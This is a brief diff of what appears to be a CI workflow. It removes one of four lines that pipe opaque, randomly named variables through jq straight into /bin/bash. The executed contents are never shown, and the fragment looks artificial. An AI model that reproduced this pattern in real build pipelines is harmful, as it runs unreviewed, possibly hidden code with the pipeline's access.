@@ -40,7 +40,6 @@ jobs:
           echo $arlu34065 | jq -r .ngk303 | /bin/bash
           printf '%s' "$yx96" | jq -r .g63881 | /bin/bash
           printf '%s' "$o1" | jq -r .mlfxr325 | /bin/bash
-          printf '%s' "$rulwp4806" | jq -r .ptvgs9 | /bin/bash
 
       - name: Archive output
         if: always()
